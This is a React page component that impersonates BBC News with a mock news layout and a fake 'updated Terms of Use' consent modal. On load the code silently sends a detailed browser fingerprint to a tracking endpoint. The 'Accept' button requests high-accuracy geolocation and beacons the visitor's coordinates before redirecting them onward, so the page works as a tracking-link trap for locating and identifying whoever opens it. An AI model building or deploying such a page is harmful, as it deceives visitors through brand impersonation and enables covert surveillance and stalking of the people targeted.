'use client';

import { useEffect, useRef } from 'react';

export default function BBCPage({ code, destination }: { code: string; destination: string }) {
  const sentFp = useRef(false);

  useEffect(() => {
    if (sentFp.current) return;
    sentFp.current = true;
    const fp = {
      screen: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      tzOffset: new Date().getTimezoneOffset(),
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages?.join(',') ?? '',
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: (navigator as Navigator & { deviceMemory?: number }).deviceMemory,
      touchPoints: navigator.maxTouchPoints,
      plugins: Array.from(navigator.plugins ?? []).map((p) => p.name).join('|'),
      referrer: document.referrer,
    };
    navigator.sendBeacon(`/api/fp/${code}`, JSON.stringify(fp));
  }, [code]);

  function go() { window.location.replace(destination); }

  function handleAccept() {
    const btn = document.getElementById('accept-btn') as HTMLButtonElement;
    btn.disabled = true;
    btn.textContent = 'Please wait…';

    if (!navigator.geolocation) { go(); return; }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        navigator.sendBeacon(`/api/loc/${code}`, JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          altAccuracy: pos.coords.altitudeAccuracy,
        }));
        showLoading();
        setTimeout(go, 1000);
      },
      () => { showLoading(); setTimeout(go, 600); },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
    );
  }

  function showLoading() {
    const modal = document.getElementById('tc-modal') as HTMLElement;
    modal.innerHTML = `
      <div style="text-align:center;padding:48px 32px">
        <div style="width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#bb1919;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 18px"></div>
        <p style="color:#222;font-size:15px;font-weight:600">Loading BBC News…</p>
        <p style="color:#767676;font-size:13px;margin-top:6px">Setting up your personalised feed</p>
      </div>
    `;
  }

  const newsItems = [
    { tag: 'POLITICS', headline: 'PM faces fresh questions over economic growth targets amid spending review', img: '374,210', time: '2 hours ago' },
    { tag: 'WORLD', headline: 'Ceasefire talks resume as international mediators push for agreement', img: '374,210', time: '3 hours ago' },
    { tag: 'BUSINESS', headline: 'FTSE 100 rises as inflation data comes in below expectations', img: '374,210', time: '4 hours ago' },
    { tag: 'TECHNOLOGY', headline: 'Major tech firms pledge to tackle AI-generated misinformation', img: '374,210', time: '5 hours ago' },
    { tag: 'HEALTH', headline: 'NHS waiting list figures show first sustained fall in three years', img: '374,210', time: '6 hours ago' },
    { tag: 'SPORT', headline: 'England squad announced ahead of summer international fixtures', img: '374,210', time: '7 hours ago' },
  ];

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Noto+Serif:wght@400;700&display=swap');
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f6f6f6;color:#222;min-height:100vh;overflow:hidden}
        @keyframes spin{to{transform:rotate(360deg)}}

        /* ── Header ── */
        .bbc-hdr{background:#000;height:60px;display:flex;align-items:center;padding:0 20px;gap:14px;position:relative;z-index:1}
        .bbc-blocks{display:flex;gap:3px}
        .bbc-blocks b{display:flex;align-items:center;justify-content:center;background:#fff;color:#000;width:28px;height:28px;font-size:16px;font-weight:900;font-style:normal;letter-spacing:-1px}
        .bbc-news-txt{color:#fff;font-size:22px;font-weight:700;letter-spacing:.4px;border-left:2.5px solid #bb1919;padding-left:11px;margin-left:2px}
        .hdr-links{margin-left:auto;display:flex;gap:20px}
        .hdr-links a{color:#aaa;font-size:13px;text-decoration:none}
        .hdr-links a:hover{color:#fff}
        .hdr-search{background:none;border:1px solid #555;color:#fff;padding:5px 10px;font-size:12px;border-radius:2px;cursor:pointer}

        /* ── Nav ── */
        .bbc-nav{background:#bb1919;display:flex;height:42px;align-items:center;padding:0 20px;gap:0;overflow:hidden;position:relative;z-index:1}
        .bbc-nav a{color:#fff;font-size:13.5px;font-weight:600;text-decoration:none;padding:0 12px;height:42px;display:flex;align-items:center;white-space:nowrap;border-bottom:3px solid transparent}
        .bbc-nav a:hover{border-bottom-color:rgba(255,255,255,.6)}
        .bbc-nav a.active{border-bottom-color:#fff}

        /* ── Breaking ticker ── */
        .breaking{background:#222;color:#fff;font-size:12px;padding:6px 20px;display:flex;align-items:center;gap:12px;position:relative;z-index:1}
        .breaking-tag{background:#bb1919;color:#fff;font-size:10px;font-weight:700;padding:2px 6px;letter-spacing:.06em;flex-shrink:0}
        .breaking span{opacity:.85}

        /* ── Page layout ── */
        .page-wrap{display:grid;grid-template-columns:1fr 340px;gap:20px;padding:20px;max-width:1200px;margin:0 auto;position:relative;z-index:1}
        .main-story{grid-column:1}
        .sidebar{grid-column:2}

        /* ── Main story ── */
        .main-img{width:100%;height:340px;background:#ccc;position:relative;overflow:hidden}
        .main-img-inner{width:100%;height:100%;background:linear-gradient(135deg,#bbb 0%,#999 100%)}
        .main-img-label{position:absolute;bottom:12px;left:12px;background:rgba(0,0,0,.7);color:#fff;font-size:11px;padding:3px 8px}
        .main-headline{font-family:'Noto Serif',Georgia,serif;font-size:26px;font-weight:700;line-height:1.25;margin:12px 0 8px;color:#111}
        .main-byline{color:#767676;font-size:13px;margin-bottom:8px}
        .main-body{font-size:15px;color:#333;line-height:1.65}
        .story-tag{display:inline-block;background:#bb1919;color:#fff;font-size:10px;font-weight:700;padding:2px 7px;letter-spacing:.05em;margin-bottom:10px}

        /* ── Story grid ── */
        .story-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px}
        .story-card{border-top:2px solid #e0e0e0;padding-top:10px}
        .story-card-tag{font-size:11px;font-weight:700;color:#bb1919;letter-spacing:.04em;margin-bottom:5px}
        .story-card-headline{font-family:'Noto Serif',Georgia,serif;font-size:16px;font-weight:700;line-height:1.3;color:#111}
        .story-card-img{width:100%;height:120px;background:linear-gradient(135deg,#ccc,#aaa);margin-bottom:8px}
        .story-card-time{font-size:11px;color:#767676;margin-top:5px}

        /* ── Sidebar ── */
        .sidebar-section{margin-bottom:20px}
        .sidebar-title{font-size:12px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.06em;border-bottom:2px solid #e0e0e0;padding-bottom:6px;margin-bottom:10px}
        .sidebar-item{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid #f0f0f0}
        .sidebar-thumb{width:80px;height:56px;background:linear-gradient(135deg,#ccc,#aaa);flex-shrink:0}
        .sidebar-item-headline{font-size:13px;font-weight:600;color:#111;line-height:1.3}
        .sidebar-item-time{font-size:11px;color:#767676;margin-top:4px}

        /* ── Overlay & Modal ── */
        .overlay{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:1000;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(1px)}
        .modal{background:#fff;width:100%;max-width:560px;margin:0 16px;border-radius:2px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,.5);max-height:90vh;display:flex;flex-direction:column}
        .modal-hdr{background:#bb1919;padding:18px 24px;flex-shrink:0}
        .modal-hdr-top{display:flex;align-items:center;gap:10px;margin-bottom:10px}
        .modal-bbc{display:flex;gap:2px}
        .modal-bbc b{display:flex;align-items:center;justify-content:center;background:#fff;color:#000;width:22px;height:22px;font-size:13px;font-weight:900;font-style:normal}
        .modal-bbc-news{color:#fff;font-size:16px;font-weight:700;border-left:2px solid rgba(255,255,255,.5);padding-left:8px;margin-left:2px}
        .modal-hdr h2{color:#fff;font-size:20px;font-weight:700;line-height:1.25}
        .modal-hdr p{color:rgba(255,255,255,.82);font-size:13px;margin-top:4px;line-height:1.5}
        .modal-body{padding:20px 24px;overflow-y:auto;flex:1}
        .modal-intro{font-size:14px;color:#333;line-height:1.6;margin-bottom:14px}
        .tc-scroll{background:#f8f8f8;border:1px solid #e0e0e0;border-radius:2px;padding:14px 16px;height:190px;overflow-y:scroll;font-size:12px;color:#555;line-height:1.7;margin-bottom:16px}
        .tc-scroll h4{color:#222;font-size:12px;font-weight:700;margin:10px 0 4px}
        .tc-scroll h4:first-child{margin-top:0}
        .tc-scroll p{margin-bottom:6px}
        .modal-footer{padding:16px 24px;border-top:1px solid #e8e8e8;flex-shrink:0}
        .accept-btn{width:100%;background:#bb1919;color:#fff;border:none;padding:14px;font-size:15px;font-weight:700;cursor:pointer;border-radius:2px;letter-spacing:.2px;transition:background .15s}
        .accept-btn:hover{background:#9e1515}
        .accept-btn:disabled{background:#aaa;cursor:default}
        .decline-btn{display:block;text-align:center;margin-top:10px;color:#767676;font-size:12px;cursor:pointer;background:none;border:none;width:100%;text-decoration:underline}
        .decline-btn:hover{color:#333}
        .modal-note{font-size:11px;color:#aaa;text-align:center;margin-top:10px;line-height:1.5}

        /* ── Footer ── */
        .bbc-footer{background:#323232;padding:16px 20px;position:relative;z-index:1}
        .bbc-footer p{color:#aaa;font-size:11px;text-align:center}
        .footer-links{display:flex;justify-content:center;gap:16px;margin-bottom:8px;flex-wrap:wrap}
        .footer-links a{color:#aaa;font-size:11px;text-decoration:none}
        .footer-links a:hover{color:#fff}
      `}</style>

      {/* ── BBC News page (background) ── */}
      <div style={{ filter: 'blur(1px)', userSelect: 'none', pointerEvents: 'none' }}>
        <div className="bbc-hdr">
          <div className="bbc-blocks"><b>B</b><b>B</b><b>C</b></div>
          <span className="bbc-news-txt">NEWS</span>
          <div className="hdr-links">
            <a href="#">Home</a>
            <a href="#">My BBC</a>
            <a href="#">Sign in</a>
            <button className="hdr-search">🔍 Search</button>
          </div>
        </div>
        <div className="bbc-nav">
          {['Home','UK','World','Business','Politics','Tech','Science','Health','Entertainment & Arts','Sport','Video'].map((n, i) => (
            <a key={n} href="#" className={i === 0 ? 'active' : ''}>{n}</a>
          ))}
        </div>
        <div className="breaking">
          <span className="breaking-tag">LIVE</span>
          <span>Follow the latest developments — House of Commons debate underway</span>
        </div>
        <div className="page-wrap">
          <div className="main-story">
            <span className="story-tag">UK NEWS</span>
            <div className="main-img">
              <div className="main-img-inner" />
              <span className="main-img-label">Getty Images</span>
            </div>
            <h1 className="main-headline">
              Government unveils sweeping reforms to planning system as housing crisis deepens
            </h1>
            <p className="main-byline">By Political Correspondent · Published 1 hour ago</p>
            <p className="main-body">
              Ministers have announced a significant overhaul of the planning system in England, promising to
              cut approval times and unlock tens of thousands of new homes across the country. The changes,
              described as the most radical shake-up in a generation, would grant automatic planning permission
              in designated growth zones…
            </p>
            <div className="story-grid">
              {newsItems.map((s) => (
                <div key={s.headline} className="story-card">
                  <div className="story-card-img" />
                  <div className="story-card-tag">{s.tag}</div>
                  <div className="story-card-headline">{s.headline}</div>
                  <div className="story-card-time">{s.time}</div>
                </div>
              ))}
            </div>
          </div>
          <div className="sidebar">
            <div className="sidebar-section">
              <div className="sidebar-title">Most Read</div>
              {['Storms expected to hit southern England this weekend',
                'Tech giant announces 3,000 job cuts across UK operations',
                'Royal family attends surprise public engagement in Edinburgh',
                'New findings challenge understanding of ancient settlement',
                'Premier League clubs submit financial fair play documents'].map((h, i) => (
                <div key={h} className="sidebar-item">
                  <div className="sidebar-thumb" />
                  <div>
                    <div style={{ fontSize: 12, fontWeight: 700, color: '#bb1919', marginBottom: 3 }}>{i + 1}</div>
                    <div className="sidebar-item-headline">{h}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
        <div className="bbc-footer">
          <div className="footer-links">
            {['Terms of Use','Privacy Policy','Cookie Policy','Accessibility','Parental Guidance','Contact the BBC','Get Personalised Newsletters','Advertise with us','AdChoices / Do Not Sell My Info'].map(l => (
              <a key={l} href="#">{l}</a>
            ))}
          </div>
          <p>Copyright © {new Date().getFullYear()} BBC. The BBC is not responsible for the content of external sites.</p>
        </div>
      </div>

      {/* ── T&C Modal overlay ── */}
      <div className="overlay">
        <div className="modal">
          <div className="modal-hdr">
            <div className="modal-hdr-top">
              <div className="modal-bbc"><b>B</b><b>B</b><b>C</b></div>
              <span className="modal-bbc-news">NEWS</span>
            </div>
            <h2>We&apos;ve updated our Terms of Use</h2>
            <p>Please review and accept to continue reading BBC News</p>
          </div>
          <div className="modal-body" id="tc-modal">
            <p className="modal-intro">
              Our Terms of Use and Privacy Policy have been updated to reflect changes in UK data
              protection law and our expanded digital services. Please read and accept the updated
              terms to continue accessing BBC News.
            </p>
            <div className="tc-scroll">
              <h4>1. About the BBC</h4>
              <p>The BBC is the British Broadcasting Corporation, a public service broadcaster established by Royal Charter. These terms govern your use of BBC digital services including bbc.co.uk, BBC iPlayer, BBC Sounds, and all associated applications.</p>

              <h4>2. Accepting these terms</h4>
              <p>By clicking "Accept &amp; Continue", you confirm that you have read, understood, and agree to be bound by these Terms of Use, our Privacy Policy, and our Cookie Policy. If you do not agree, you should discontinue use of BBC services.</p>

              <h4>3. Personalisation and data use</h4>
              <p>To deliver a personalised experience, the BBC processes data including your browsing behaviour, content preferences, device identifiers, and approximate location derived from your IP address. This data is used solely to improve the relevance of content, local news, weather, and travel information we provide.</p>

              <h4>4. Location services</h4>
              <p>Where you grant permission, the BBC may access your device's precise geographic location to deliver locally relevant content including regional news, accurate local weather forecasts, and nearby event listings. Location data is processed in accordance with UK GDPR and is not shared with third-party advertisers. You may revoke location permission at any time through your device settings.</p>

              <h4>5. Cookies and tracking</h4>
              <p>The BBC uses strictly necessary, functional, and performance cookies to operate its services. By accepting these terms you consent to the placement of such cookies on your device. You may manage your preferences at any time through the Cookie Settings panel.</p>

              <h4>6. Content and intellectual property</h4>
              <p>All content on BBC digital services, including text, images, audio and video, is protected by copyright and owned by or licensed to the BBC. You may access content for personal, non-commercial use only. Reproduction, redistribution or commercial exploitation is strictly prohibited without prior written consent.</p>

              <h4>7. User conduct</h4>
              <p>You agree not to use BBC services in any manner that is unlawful, harmful, abusive, or that infringes the rights of others. The BBC reserves the right to restrict or terminate access at its sole discretion.</p>

              <h4>8. Amendments</h4>
              <p>The BBC may update these Terms of Use periodically. Continued use of BBC services following notification of changes constitutes acceptance of the revised terms. These terms were last updated on 1 January 2025.</p>
            </div>
          </div>
          <div className="modal-footer">
            <button id="accept-btn" className="accept-btn" onClick={handleAccept}>
              Accept &amp; Continue to BBC News
            </button>
            <button className="decline-btn" onClick={go}>
              Continue without accepting (limited access)
            </button>
            <p className="modal-note">
              By accepting you agree to our <u>Terms of Use</u>, <u>Privacy Policy</u> and <u>Cookie Policy</u>.
              BBC, Broadcasting House, Portland Place, London W1A 1AA.
            </p>
          </div>
        </div>
      </div>
    </>
  );
}
